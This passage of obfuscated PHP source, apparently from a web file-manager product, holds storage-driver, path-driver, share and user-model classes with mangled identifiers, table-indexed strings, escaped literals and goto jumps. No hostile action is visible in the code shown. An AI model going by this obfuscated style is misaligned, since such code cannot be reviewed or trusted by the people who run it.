$”çä’÷¾[73] . (string) (time() + $•Ú“‘“ç); $‰Â„¯‰ƒ = array($”çä’÷¾[269] => $êßï¼øá, $”çä’÷¾[272] => array(array($”çä’÷¾[274] => $¶Èˆ©…ß), array($”çä’÷¾[273] => $this->bucket), array($”çä’÷¾[275], $”çä’÷¾[276], $”çä’÷¾[12]), array($”çä’÷¾[279] => $Î²Çó), array($”çä’÷¾[1382] => $áà˜œá), array($”çä’÷¾[1383] => $this->accessKey), array($”çä’÷¾[1384] => $Ä˜µµÔš))); $‰Â„¯‰ƒ = json_encode($‰Â„¯‰ƒ); $”É‹¬’š = hash_hmac($”çä’÷¾[258], $Ä˜µµÔš, $this->secret); $ıÛ“—Ó = sha1($‰Â„¯‰ƒ); $ÇÎØèä® = hash_hmac($”çä’÷¾[258], $ıÛ“—Ó, $”É‹¬’š); $Ï¹‹Ôš² = array($”çä’÷¾[274] => $¶Èˆ©…ß, $”çä’÷¾[279] => $Î²Çó, $”çä’÷¾[287] => base64_encode($‰Â„¯‰ƒ), $”çä’÷¾[1382] => $áà˜œá, $”çä’÷¾[1383] => $this->accessKey, $”çä’÷¾[1385] => $Ä˜µµÔš, $”çä’÷¾[1386] => $ÇÎØèä®, $”çä’÷¾[198] => $this->getHost()); return $Ï¹‹Ôš²; } public function fileOutLink($Ÿ·ä£½Õ) { $³€ÁãÄù =& $_SERVER[ú‡®¯¨±]; if (substr($Ÿ·ä£½Õ, 0, 7) == $³€ÁãÄù[1387]) { $Ÿ·ä£½Õ = $³€ÁãÄù[1388] . substr($Ÿ·ä£½Õ, 7); } header($³€ÁãÄù[164] . $Ÿ·ä£½Õ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($–ÂöÎÂÕ) { $this->pathParse = $–ÂöÎÂÕ; $this->model = Model($_SERVER[ú‡®¯¨±][1389]); } public function getPath($»˜ü·¼Á) { return trim($»˜ü·¼Á, $_SERVER[ú‡®¯¨±][8]); } public function pathFather($¬èÏ±Ú) { $¡ÒûËÑ = $this->parse($¬èÏ±Ú); $¡ÒûËÑ = $this->infoSimple($¬èÏ±Ú); return $¡ÒûËÑ ? $¡ÒûËÑ[$_SERVER[ú‡®¯¨±][182]] : !1; } public function pathThis($´Í¥ıöÏ) { $¥Äªáûı = $this->infoSimple($´Í¥ıöÏ); return $¥Äªáûı ? $¥Äªáûı[$_SERVER[ú‡®¯¨±][32]] : !1; } public function getPathOuter($çìù´ËÊ) { if (!$çìù´ËÊ) { return $çìù´ËÊ; } $›¢¨”Ü‡ = $this->parse($çìù´ËÊ); return KodIO::make($›¢¨”Ü‡[$_SERVER[ú‡®¯¨±][453]]); } public function copyFolderFromIO($•ëºÑÖ«, $´‘¬Ã§½, $–ş£ñÄÏ, $÷üàèÊ×, $Î÷Ò¾ôß) { $×Ãò«åÜ = $this->model->copyFolderFromIO($•ëºÑÖ«, $´‘¬Ã§½, $–ş£ñÄÏ, $÷üàèÊ×, $Î÷Ò¾ôß); return KodIO::make($×Ãò«åÜ); } public function isParentOf($Á©Ç¨Ïı, $ŒÆ¹Æ²Å) { return $this->model->isParentOf($Á©Ç¨Ïı, $ŒÆ¹Æ²Å); } public function mkfile($ ÑÍšò, $‹ÆúÚ† = '', $Êô«Ù§÷ = REPEAT_RENAME) { $÷¥çÒã· =& $_SERVER[ú‡®¯¨±]; $”óª‘½ = $this->parse($ ÑÍšò); $ ÑÍšò = $”óª‘½[$÷¥çÒã·[453]]; for ($ú«ãÍäÄ = 0; $ú«ãÍäÄ < count($”óª‘½[$÷¥çÒã·[1390]]); $ú«ãÍäÄ++) { $çâ»½ = $”óª‘½[$÷¥çÒã·[1390]][$ú«ãÍäÄ]; if ($ú«ãÍäÄ == count($”óª‘½[$÷¥çÒã·[1390]]) - 1) { $ ÑÍšò = $this->model->mkfile($ ÑÍšò, $çâ»½, $‹ÆúÚ†, $Êô«Ù§÷); break; } $ ÑÍšò = $this->model->mkdir($ ÑÍšò, $çâ»½, REPEAT_SKIP); } return $this->getPathOuter($ ÑÍšò); } public function mkdir($õ¼œ†å, $à¾§Ù¥ = REPEAT_SKIP) { $Şã®‰ß =& $_SERVER[ú‡®¯¨±]; $²ÌñÒÊµ = $this->parse($õ¼œ†å); $õ¼œ†å = $²ÌñÒÊµ[$Şã®‰ß[453]]; for ($­ôßÎøô = 0; $­ôßÎøô < count($²ÌñÒÊµ[$Şã®‰ß[1390]]); $­ôßÎøô++) { $öÀ££¾û = $²ÌñÒÊµ[$Şã®‰ß[1390]][$­ôßÎøô]; $õ¼œ†å = $this->model->mkdir($õ¼œ†å, $öÀ££¾û, $à¾§Ù¥); } return $this->getPathOuter($õ¼œ†å); } public function copyFile($ª‰¢Âà, $Â¼¿µàÅ, $€ã±¨Ñ = REPEAT_REPLACE) { $ğ–ŒÎ£´ =& $_SERVER[ú‡®¯¨±]; $ğ°®ÅÑí = $this->parse($Â¼¿µàÅ); $–»»®® = $this->model->copy($ª‰¢Âà, $ğ°®ÅÑí[$ğ–ŒÎ£´[453]], $€ã±¨Ñ, $ğ°®ÅÑí[$ğ–ŒÎ£´[86]]); return $–»»®® ? $this->getPathOuter($–»»®®) : !1; } public function moveFile($ÜÄÈº²÷, $ªõõ¯®, $¥™¹° = REPEAT_REPLACE) { $ö‚„Ã =& $_SERVER[ú‡®¯¨±]; $Á€Ğ†ï = $this->parse($ªõõ¯®); $¥¬—ª–È = $this->model->move($ÜÄÈº²÷, $Á€Ğ†ï[$ö‚„Ã[453]], $¥™¹°, $Á€Ğ†ï[$ö‚„Ã[86]]); return $¥¬—ª–È ? $this->getPathOuter($¥¬—ª–È) : !1; } public function copy($‡©şÔ­·, $øÚÇÜ»õ, $¶ÊÌÖÌ = REPEAT_REPLACE, $ƒĞğ€ = false) { $¿˜‰¾úä = $this->parse($øÚÇÜ»õ); $²Ûµ¥ŸÈ = $this->model->copy($‡©şÔ­·, $¿˜‰¾úä[$_SERVER[ú‡®¯¨±][453]], $¶ÊÌÖÌ, $ƒĞğ€); return $²Ûµ¥ŸÈ ? $this->getPathOuter($²Ûµ¥ŸÈ) : !1; } public function moveSameAllow() { } public function move($¬âà›Å¬, $¨Ãó‘§Ô, $§ùº™½ò = REPEAT_REPLACE, $›œ¢Ñ‹¾ = false) { $ğîæ’ÒÃ = $this->parse($¨Ãó‘§Ô); $”»Š·×ü = $this->model->move($¬âà›Å¬, $ğîæ’ÒÃ[$_SERVER[ú‡®¯¨±][453]], $§ùº™½ò, $›œ¢Ñ‹¾); return $”»Š·×ü ? $this->getPathOuter($”»Š·×ü) : !1; } public function remove($ÍâôÈîë, $¹ºöá¸Ç = true) { return $this->model->remove($ÍâôÈîë, $¹ºöá¸Ç); } public function rename($ÎÃ…øŒ³, $§€ŠØÚ„) { $Œß§‹¤ = $this->model->rename($ÎÃ…øŒ³, $§€ŠØÚ„); return $Œß§‹¤ ? $this->getPathOuter($ÎÃ…øŒ³) : $Œß§‹¤; } public function size($¦•×Üà¤) { $‰šÔœÀ´ = $this->infoSimple($¦•×Üà¤); return $‰šÔœÀ´ ? $‰šÔœÀ´[$_SERVER[ú‡®¯¨±][78]] : 0; } public function infoSimple($Û¤ã¯ÇŞ) { return $this->model->sourceInfo($Û¤ã¯ÇŞ); } public function info($×áßİàº) { return $this->infoParse($×áßİàº); } public function infoAuth($Á´Ïƒ§§) { return $this->infoParse($Á´Ïƒ§§, !1, !0); } public function infoWithChildren($Ë—Áš) { return $this->infoParse($Ë—Áš, !0); } protected function infoParse($Áş·ôÑ, $ÅÈŸƒ‰ = false, $ƒâ‰„ÆÆ = false) { if (!$ÅÈŸƒ‰) { return $this->model->pathInfo($Áş·ôÑ, $ƒâ‰„ÆÆ); } return $this->model->pathInfoMore($Áş·ôÑ); } public function infoFullSimple($…ÌóİÛ†) { $×¶³Ä»Ê =& $_SERVER[ú‡®¯¨±]; $‚Ìëå¬Í = explode($×¶³Ä»Ê[8], $…ÌóİÛ†); $û“å·„ï = implode($×¶³Ä»Ê[8], array_splice($‚Ìëå¬Í, 1)); return $this->model->pathInfoByPath($‚Ìëå¬Í[0], $û“å·„ï); } public function infoFull($ó’ÊÂí…) { $Ê³¨È¬ = $this->infoFullSimple($ó’ÊÂí…); return is_array($Ê³¨È¬) ? $this->model->pathInfo($Ê³¨È¬[$_SERVER[ú‡®¯¨±][183]]) : !1; } public function hashSimple($™µùÛ»¤) { $äí°ç§ =& $_SERVER[ú‡®¯¨±]; $µœú¤Ş£ = $this->infoWithChildren($™µùÛ»¤); return $µœú¤Ş£[$äí°ç§[527]][$äí°ç§[650]]; } public function hashMd5($¸ÔŒ¾´œ) { $ã‰¾£×¿ =& $_SERVER[ú‡®¯¨±]; $Ìüæ³ï = $this->infoWithChildren($¸ÔŒ¾´œ); return $Ìüæ³ï[$ã‰¾£×¿[527]][$ã‰¾£×¿[525]]; } public function exist($éµÜ½ûú) { $ÂÙŞ¹ÚÆ =& $_SERVER[ú‡®¯¨±]; $¤Ù©Ø® = $this->parse($éµÜ½ûú); if (!$¤Ù©Ø®[$ÂÙŞ¹ÚÆ[86]]) { return $this->isFile($éµÜ½ûú) || $this->isFolder($éµÜ½ûú); } $é¼˜Œî² = array($ÂÙŞ¹ÚÆ[455] => $¤Ù©Ø®[$ÂÙŞ¹ÚÆ[453]], $ÂÙŞ¹ÚÆ[32] => $¤Ù©Ø®[$ÂÙŞ¹ÚÆ[86]]); $šƒÊ¡¦ö = $this->model->where($é¼˜Œî²)->find(); return $šƒÊ¡¦ö ? !0 : !1; } public function isFile($çÆãÚàæ) { $ÌË¿‚Ğ =& $_SERVER[ú‡®¯¨±]; $“£­¶¨Ä = $this->infoSimple($çÆãÚàæ); return $“£­¶¨Ä && $“£­¶¨Ä[$ÌË¿‚Ğ[463]] == $ÌË¿‚Ğ[224] ? !0 : !1; } public function isFolder($¡»÷ì‡) { $šôì˜èÅ =& $_SERVER[ú‡®¯¨±]; $Ñ¼ı×› = $this->infoSimple($¡»÷ì‡); return $Ñ¼ı×› && $Ñ¼ı×›[$šôì˜èÅ[463]] == $šôì˜èÅ[90] ? !0 : !1; } public function listPath($É¥¹¿‹˜, $ØÎïÅá» = false) { $ò³„òû =& $_SERVER[ú‡®¯¨±]; if ($É¥¹¿‹˜ == $ò³„òû[12]) { return !1; } $®€Çåñ = array($ò³„òû[455] => $É¥¹¿‹˜); if ($ØÎïÅá») { return $this->model->listSource($®€Çåñ, -1); } return $this->model->listSource($®€Çåñ); } public function has($Û•ö¾Å™, $Ç½Õ¦÷ = false, $Ê¼ñ†– = null) { $¶Šà¨„ä =& $_SERVER[ú‡®¯¨±]; $õçÏ“¹ƒ = $this->infoWithChildren($Û•ö¾Å™); if ($Ç½Õ¦÷) { return array($¶Šà¨„ä[236] => $õçÏ“¹ƒ[$¶Šà¨„ä[236]], $¶Šà¨„ä[235] => $õçÏ“¹ƒ[$¶Šà¨„ä[235]]); } return $Ê¼ñ†– ? $õçÏ“¹ƒ[$¶Šà¨„ä[236]] : $õçÏ“¹ƒ[$¶Šà¨„ä[235]]; } public function listAll($˜±Åê Ü) { $¯Äº½« = IO::info($this->pathParse[$_SERVER[ú‡®¯¨±][86]]); if (!$¯Äº½«) { return array(); } return $this->model->listAll($˜±Åê Ü); } public function getContent($ÅÎ…Ÿ×û) { return $this->model->getContent($ÅÎ…Ÿ×û); } public function setContent($¢É—‘Îò, $Ù®Äêšè = '') { return $this->model->setContent($¢É—‘Îò, $Ù®Äêšè); } public function fileSubstr($²üùÅ, $‰Ó»ÜÇä, $„·ƒ˜ø¡) { return $this->model->fileSubstr($²üùÅ, $‰Ó»ÜÇä, $„·ƒ˜ø¡); } public function download($—èœòÍ³, $·ÀÅéÜ– = '') { $¾Ë´·’ö = get_path_father($·ÀÅéÜ–); $íË®¢Â˜ = get_path_this($·ÀÅéÜ–); $ÅŸ¢¯…è = $this->model->fileInfoGet($—èœòÍ³); $“’¢á•µ = IO::copy($ÅŸ¢¯…è[$_SERVER[ú‡®¯¨±][86]], $¾Ë´·’ö, !1, $íË®¢Â˜); return $“’¢á•µ; } public function setModifyTime($ÜÏ’Ãå, $Áó²°×¨ = '') { $‚¥ÉÀªã =& $_SERVER[ú‡®¯¨±]; if (!$ÜÏ’Ãå) { return; } $this->model->where(array($‚¥ÉÀªã[469] => $ÜÏ’Ãå))->save(array($‚¥ÉÀªã[87] => $Áó²°×¨)); } public function upload($‰ñÄªä’, $¢ıÅ¡æ¥, $ŒÇ­°— = false, $Ö±çìÅ´ = REPEAT_REPLACE) { $úœ”æ· =& $_SERVER[ú‡®¯¨±]; $ŞÉ§ƒ´× = $this->parse($‰ñÄªä’); $±Ê‡ÎÇ = $this->model->addFile($ŞÉ§ƒ´×[$úœ”æ·[453]], $¢ıÅ¡æ¥, $ŞÉ§ƒ´×[$úœ”æ·[86]], $ŒÇ­°—, $Ö±çìÅ´); return $this->getPathOuter($±Ê‡ÎÇ); } public function uploadFileByID($€Ø’üı, $’ÃşûŞº, $·ßË¢ø¬) { $°Û¡„‹ =& $_SERVER[ú‡®¯¨±]; $Ë¦´Œú = $this->parse($€Ø’üı); $êô˜…‹® = $this->model->addFileByFileID($Ë¦´Œú[$°Û¡„‹[453]], $’ÃşûŞº, $Ë¦´Œú[$°Û¡„‹[86]], $·ßË¢ø¬); return $this->getPathOuter($êô˜…‹®); } public function addFileByRemote($¯Üç˜¸, $˜‡Ç½¹, $Æñğ¯Å  = array(), $”Ÿ¼±­à = '', $«°ŸıÃë) { $“å¬§Ó÷ =& $_SERVER[ú‡®¯¨±]; $«‰†øˆ = $this->parse($¯Üç˜¸); $”Ÿ¼±­à = empty($”Ÿ¼±­à) ? $«‰†øˆ[$“å¬§Ó÷[86]] : $”Ÿ¼±­à; $½ÂöĞ¨˜ = $this->model->addFileByRemote($«‰†øˆ[$“å¬§Ó÷[453]], $˜‡Ç½¹, $”Ÿ¼±­à, $Æñğ¯Å , $«°ŸıÃë); return $this->getPathOuter($½ÂöĞ¨˜); } public function uploadLink($½üØ¸’, $öº˜®˜ï = 0) { $ù¤–è¢ =& $_SERVER[ú‡®¯¨±]; $Â‘—âÓÆ = $this->parse($½üØ¸’); $¶®½¿¤¹ = _get($GLOBALS[$ù¤–è¢[7]], $ù¤–è¢[1391]); $äî²†ŸÓ = _get($GLOBALS[$ù¤–è¢[7]], $ù¤–è¢[1392]); $½üØ¸’ = Model($ù¤–è¢[652])->createFileName($Â‘—âÓÆ[$ù¤–è¢[86]], $¶®½¿¤¹, $äî²†ŸÓ); return IO::uploadLink($½üØ¸’, $öº˜®˜ï); } public function fileNameAuto($óÜ£‚‹ş, $©úÌ¸ê”, $‹Ïêç‘à = REPEAT_REPLACE, $«Ãßî»ª = false) { return $this->model->fileNameAuto($óÜ£‚‹ş, $©úÌ¸ê”, $‹Ïêç‘à, $«Ãßî»ª); } public function fileNameExist($ã²ø‚ë„, $ìÂØËçè) { return $this->model->fileNameExist($ã²ø‚ë„, $ìÂØËçè); } protected function _fileOut($îÅ•ŒÏ, $ÚÉÙËƒà = false, $ù¸ÚÄà = false, $§õÏşëÌ = '', $ÃÕÃíıø = false) { $ı±¥œù· =& $_SERVER[ú‡®¯¨±]; $İ†ÁÌ›– = $this->model->sourceInfo($îÅ•ŒÏ); if ($İ†ÁÌ›–[$ı±¥œù·[463]] == $ı±¥œù·[90]) { header($ı±¥œù·[1393]); die; } $èİ²®… = $this->model->fileInfoGet($îÅ•ŒÏ); $§õÏşëÌ = $èİ²®…[$ı±¥œù·[525]] ? $èİ²®…[$ı±¥œù·[525]] : $§õÏşëÌ; $ÓÅ‚Ø÷í = is_array($GLOBALS[$ı±¥œù·[171]]) ? $GLOBALS[$ı±¥œù·[171]][$ı±¥œù·[32]] : $İ†ÁÌ›–[$ı±¥œù·[32]]; if ($ÃÕÃíıø) { return IO::fileOutServer($èİ²®…[$ı±¥œù·[86]], $ÚÉÙËƒà, $ÓÅ‚Ø÷í, $§õÏşëÌ); } IO::fileOut($èİ²®…[$ı±¥œù·[86]], $ÚÉÙËƒà, $ÓÅ‚Ø÷í, $§õÏşëÌ); } public function fileOut($ò—ÄŸá—, $ø½ïÀ«ƒ = false, $ğšÑÊº = false, $×³÷÷‘² = '') { $this->_fileOut($ò—ÄŸá—, $ø½ïÀ«ƒ, $ğšÑÊº, $×³÷÷‘²); } public function fileOutServer($Í¾ä´ä­, $é‚œÍµæ = false, $“ñ†•„é = false, $§èº·„æ = '') { $this->_fileOut($Í¾ä´ä­, $é‚œÍµæ, $“ñ†•„é, $§èº·„æ, !0); } protected function _fileOutImage($ÑÚõ¥ó, $§›á¬Ó = 250) { $ß·ÙáÕ˜ =& $_SERVER[ú‡®¯¨±]; $ÁŸÅ¯ãä = $this->model->pathInfo($ÑÚõ¥ó); if ($ÁŸÅ¯ãä[$ß·ÙáÕ˜[463]] == $ß·ÙáÕ˜[90]) { show_json($ß·ÙáÕ˜[1394] . $ÑÚõ¥ó, !1); } $üÑ›Ê¢Ë = $this->model->fileInfoGet($ÑÚõ¥ó); $ÁŸÅ¯ãä[$ß·ÙáÕ˜[172]] = $üÑ›Ê¢Ë[$ß·ÙáÕ˜[86]]; $GLOBALS[$ß·ÙáÕ˜[171]] = $ÁŸÅ¯ãä; IO::fileOutImage($üÑ›Ê¢Ë[$ß·ÙáÕ˜[86]], $§›á¬Ó); } public function fileOutImage($¼Şæµš, $•ıØÃü° = 250) { $this->_fileOutImage($¼Şæµš, $•ıØÃü°); } public function fileOutImageServer($Ëî…ºö, $¢éÓœ©õ = 250) { $this->_fileOutImage($Ëî…ºö, $¢éÓœ©õ); } public function link($÷¬ëú­æ, $„û”‚ = '') { $¾™…§ñú = $this->model->fileInfoGet($÷¬ëú­æ); return IO::link($¾™…§ñú[$_SERVER[ú‡®¯¨±][86]], $„û”‚); } protected function parse($ÕŠ‡ÌĞé) { $ñ²”Çıë =& $_SERVER[ú‡®¯¨±]; if (strstr($ÕŠ‡ÌĞé, $ñ²”Çıë[8]) === !1) { return array($ñ²”Çıë[471] => intval($ÕŠ‡ÌĞé), $ñ²”Çıë[86] => $ñ²”Çıë[12], $ñ²”Çıë[1390] => array()); } $á–¬ß¨ = explode($ñ²”Çıë[8], trim($ÕŠ‡ÌĞé, $ñ²”Çıë[8])); if (count($á–¬ß¨) < 2) { show_tips(clear_html($ÕŠ‡ÌĞé) . $ñ²”Çıë[1395]); } return array($ñ²”Çıë[471] => intval($á–¬ß¨[0]), $ñ²”Çıë[86] => $á–¬ß¨[1], $ñ²”Çıë[1390] => array_slice($á–¬ß¨, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($´í³ø·) { $this->pathParse = $´í³ø·; $this->model = Model($_SERVER[ú‡®¯¨±][1389]); } public function getPathOuter($§“ŞŞ¹ª) { $é¬à®­ =& $_SERVER[ú‡®¯¨±]; if (!$§“ŞŞ¹ª) { return $§“ŞŞ¹ª; } $ˆƒ¯Œò = $this->parse($§“ŞŞ¹ª); return trim(KodIO::makeShare($this->pathParse[$é¬à®­[453]], $ˆƒ¯Œò[$é¬à®­[453]]), $é¬à®­[8]); } protected function infoParse($æºˆá, $ÜÏ‡’ğÁ = false, $ıÊÍÄÂ© = false) { $”ö¢ğó =& $_SERVER[ú‡®¯¨±]; $‰îê¿íı = $this->pathParse[$”ö¢ğó[453]]; $ë‘ÊÀé– = trim($this->pathParse[$”ö¢ğó[1224]], $”ö¢ğó[8]); return Action($”ö¢ğó[1396])->sharePathInfo($‰îê¿íı, $ë‘ÊÀé–, $ÜÏ‡’ğÁ); } public function infoFull($‘Ñêó) { $¼¡¸€ÓŠ =& $_SERVER[ú‡®¯¨±]; $Ÿ•‹Ë´¬ = explode($¼¡¸€ÓŠ[8], trim($‘Ñêó, $¼¡¸€ÓŠ[8])); if (count($Ÿ•‹Ë´¬) > 1) { $ ¹Ò˜©Ç = implode($¼¡¸€ÓŠ[8], array_splice($Ÿ•‹Ë´¬, 1)); $æâúÑî = $this->model->pathInfoByPath($Ÿ•‹Ë´¬[0], $ ¹Ò˜©Ç); if (!$æâúÑî) { return !1; } $this->pathParse[$¼¡¸€ÓŠ[1224]] = $æâúÑî[$¼¡¸€ÓŠ[183]]; } return $this->infoParse($‘Ñêó); } public function listAll($¿±©Š¶¤) { $°Àïå† =& $_SERVER[ú‡®¯¨±]; $¯ï‡Í = IO::info($this->pathParse[$°Àïå†[86]]); if (!$¯ï‡Í) { return array(); } $‚…î´¢½ = $this->model->listAll($¿±©Š¶¤); $šàºÔîø = Model($°Àïå†[642])->getInfo($¯ï‡Í[$°Àïå†[643]]); foreach ($‚…î´¢½ as &$…ö²¬¶Ï) { check_abort(); $…ö²¬¶Ï[$°Àïå†[89]] = Action($°Àïå†[1396])->_shareItemeParse($…ö²¬¶Ï[$°Àïå†[89]], $šàºÔîø); } unset($…ö²¬¶Ï); return $‚…î´¢½; } } goto d´ÎÍÍ‚™½; a«ÈÀÔîîº: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\152\x6f\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x64\145\x73\143", "\163\x6f\162\x74"); const JOB_KEY = "\163\145\154\146\x4a\x6f\x62\114\x69\163\x74"; public function listData($«Î‡ıÜŒ = false, $Û™¸÷ô = "\163\x6f\x72\x74", $â‰´ò = false) { return parent::listData($«Î‡ıÜŒ, $Û™¸÷ô, $â‰´ò); } public function remove($Ö¾Ÿã¥©) { return parent::remove($Ö¾Ÿã¥©); } public function add($Éñ„Íóê) { $ß±šÊ™ =& $_SERVER[ú‡®¯¨±]; if ($this->findByName($Éñ„Íóê[$ß±šÊ™[32]])) { return !1; } $Éñ„Íóê[$ß±šÊ™[1930]] = $this->getSort(); return parent::insert($Éñ„Íóê); } private function getSort() { $¼óØ¡ï¶ =& $_SERVER[ú‡®¯¨±]; $ÜàüÎ© = parent::listData(); $ ˆÌˆŞ— = array_to_keyvalue($ÜàüÎ©, $¼óØ¡ï¶[12], $¼óØ¡ï¶[1930]); return empty($ ˆÌˆŞ—) ? 0 : max($ ˆÌˆŞ—) + 1; } public function update($»¥¤ÜÃš, $µÄ†îè—) { $áíÓ‡  =& $_SERVER[ú‡®¯¨±]; $°è©‚¥Æ = parent::listData($»¥¤ÜÃš); $æêçƒÄê = $this->findByName($µÄ†îè—[$áíÓ‡ [32]]); if (!$°è©‚¥Æ || $æêçƒÄê && $æêçƒÄê[$áíÓ‡ [453]] != $°è©‚¥Æ[$áíÓ‡ [453]]) { return !1; } return parent::update($»¥¤ÜÃš, $µÄ†îè—); } public function setUserJob($­Ù„ÚİÉ, $ğÔËä ¿) { $ÈµÂ¥«æ =& $_SERVER[ú‡®¯¨±]; if (!is_array($ğÔËä ¿)) { $ğÔËä ¿ = array($ğÔËä ¿); } $µœíÑ¼ = parent::listData(); $”Ì»›¨ = array_to_keyvalue($µœíÑ¼, $ÈµÂ¥«æ[32]); $Œ¦ïÅÏ = $ÈµÂ¥«æ[211]; foreach ($ğÔËä ¿ as $é»°úß) { if ($”Ì»›¨[$é»°úß]) { $Œ¦ïÅÏ .= $”Ì»›¨[$é»°úß][$ÈµÂ¥«æ[453]] . $ÈµÂ¥«æ[50]; } else { $¼Ğê°® = $this->add($é»°úß); $Œ¦ïÅÏ .= $¼Ğê°® . $ÈµÂ¥«æ[50]; } } $Œ¦ïÅÏ = rtrim($Œ¦ïÅÏ, $ÈµÂ¥«æ[50]); Model($ÈµÂ¥«æ[577])->metaSet($­Ù„ÚİÉ, self::JOB_KEY, $Œ¦ïÅÏ); } public function getUserJob($Œõ×êŠú) { $—ĞÀ“²” = Model($_SERVER[ú‡®¯¨±][577])->metaGet($Œõ×êŠú); return $this->getUserJobInfo($—ĞÀ“²”[self::JOB_KEY]); } public function getUserJobInfo($Õ­Ğş¾´) { $êïªôüà =& $_SERVER[ú‡®¯¨±]; $ÀúÈçöŞ = explode($êïªôüà[50], $Õ­Ğş¾´); $†¾§Îğ = parent::listData(); $†¾§Îğ = array_remove_key($†¾§Îğ, $êïªôüà[227]); $£Ç¤ñËÕ = array(); foreach ($ÀúÈçöŞ as $ºŒ·ó€³) { if (isset($†¾§Îğ[$ºŒ·ó€³])) { $£Ç¤ñËÕ[] = $†¾§Îğ[$ºŒ·ó€³]; } } return $£Ç¤ñËÕ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\x65" => "\x75\x73\x65\162\x5f\x6d\145\x74\x61", "\155\145\164\141\x46\x69\145\x6c\144" => "\165\x73\x65\162\111\104"); protected $simpleField = "\165\163\x65\x72\111\x44\x2c\156\x69\143\x6b\x4e\141\155\x65\54\156\141\x6d\145\54\141\166\141\164\x61\x72\54\163\145\x78\54\x73\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($©İå‚ÛÎ) { $¢éÀô‰¹ =& $_SERVER[ú‡®¯¨±]; $‚ïÍğ‹´ = $¢éÀô‰¹[2360]; return array($¢éÀô‰¹[1984] => array($©İå‚ÛÎ[0], $‚ïÍğ‹´), $¢éÀô‰¹[1986] => array($©İå‚ÛÎ[0], $‚ïÍğ‹´), $¢éÀô‰¹[2361] => array($©İå‚ÛÎ[0], $‚ïÍğ‹´)); } protected function getInfo($òƒÉé£‘, $¹¶áÉœó = false) { $–÷Ğœ“ = $this->getInfoSimple($òƒÉé£‘); if (!is_array($–÷Ğœ“)) { return array(); } if ($¹¶áÉœó) { return $this->_getInfoApply($–÷Ğœ“); } return $this->cacheFunctionGet($_SERVER[ú‡®¯¨±][1988], $òƒÉé£‘); } protected function getInfoFull($à‡Î©ò, $ëÔ…¥ø× = false) { $ù´—ƒ¡ = $this->getInfoSimple($à‡Î©ò); if (!is_array($ù´—ƒ¡)) { return array(); } if ($ëÔ…¥ø×) { return $this->_getInfoApply($ù´—ƒ¡, !0); } return $this->cacheFunctionGet($_SERVER[ú‡®¯¨±][2362], $à‡Î©ò); } private function _getInfoApply($ö÷Ó¢Î, $ÉÌ„µœÁ = false) { $ ·çÄ® =& $_SERVER[ú‡®¯¨±]; if (!$ö÷Ó¢Î) { return $ö÷Ó¢Î; } $¯Ÿ õ·à = md5($ ·çÄ®[2363] . $ö÷Ó¢Î[$ ·çÄ®[945]] . $ ·çÄ®[2364] . $ö÷Ó¢Î[$ ·çÄ®[32]]); $ö÷Ó¢Î = $this->_listDataApplyItem($ö÷Ó¢Î); $Õ ûÅÇ = Model($ ·çÄ®[1389])->metaGet($ö÷Ó¢Î[$ ·çÄ®[89]][$ ·çÄ®[183]]); $ö÷Ó¢Î[$ ·çÄ®[2365]] = $¯Ÿ õ·à; $ö÷Ó¢Î[$ ·çÄ®[89]][$ ·çÄ®[2182]] = isset($Õ ûÅÇ[$ ·çÄ®[2183]]) ? $Õ ûÅÇ[$ ·çÄ®[2183]] : null; if ($ÉÌ„µœÁ) { $ö÷Ó¢Î[$ ·çÄ®[517]] = $this->metaGet($ö÷Ó¢Î[$ ·çÄ®[1708]]); } return $ö÷Ó¢Î; } protected function getInfoSimple($¬áåô¶ , $Èä¼Ò™ = false) { $ğÀÎ¼ë =& $_SERVER[ú‡®¯¨±]; if (!$¬áåô¶ ) { return array(); } if ($Èä¼Ò™) { $Îì¤õÂÃ = $this->where(array($ğÀÎ¼ë[1708] => intval($¬áåô¶ )))->find(); if (!is_array($Îì¤õÂÃ)) { return array(); } $Îì¤õÂÃ[$ğÀÎ¼ë[2366]] = Action($ğÀÎ¼ë[2367])->parseUrl($Îì¤õÂÃ[$ğÀÎ¼ë[2366]]); return $Îì¤õÂÃ; } return $this->cacheFunctionGet($ğÀÎ¼ë[1989], $¬áåô¶ ); } protected function getInfoSimpleOuter($Êı·“Ì×) { $â‰ÍõÙ =& $_SERVER[ú‡®¯¨±]; if (!$Êı·“Ì× || $Êı·“Ì× == 0) { return array($â‰ÍõÙ[1708] => $â‰ÍõÙ[224], $â‰ÍõÙ[32] => $â‰ÍõÙ[165] . LNG($â‰ÍõÙ[2368]) . $â‰ÍõÙ[167], $â‰ÍõÙ[2366] => STATIC_PATH . $â‰ÍõÙ[2369]); } $…¦‹´„Í = $this->cacheFunctionGet($â‰ÍõÙ[1989], $Êı·“Ì×); $ŠˆŒ¿›“ = array_field_key($…¦‹´„Í, explode($â‰ÍõÙ[50], $this->simpleField)); if (!$ŠˆŒ¿›“) { return array($â‰ÍõÙ[1708] => $â‰ÍõÙ[1244], $â‰ÍõÙ[32] => $â‰ÍõÙ[165] . LNG($â‰ÍõÙ[2370]) . $â‰ÍõÙ[167], $â‰ÍõÙ[2366] => STATIC_PATH . $â‰ÍõÙ[2371]); } $ŠˆŒ¿›“[$â‰ÍõÙ[2366]] = Action($â‰ÍõÙ[2367])->parseUrl($ŠˆŒ¿›“[$â‰ÍõÙ[2366]]); return $ŠˆŒ¿›“; } protected function groupUser($»¾‘Ğğ) { } public static function errorLang($Ù¢Åò¯İ) { $Ó®ãş…Ä =& $_SERVER[ú‡®¯¨±]; $¶ªĞªóÒ = array(self::ERROR_USER_NOT_EXISTS => $Ó®ãş…Ä[2372], self::ERROR_USER_PASSWORD_ERROR => $Ó®ãş…Ä[2373], self::ERROR_USER_EXIST_NAME => $Ó®ãş…Ä[2374], self::ERROR_USER_EXIST_PHONE => $Ó®ãş…Ä[2375], self::ERROR_USER_EXIST_EMAIL => 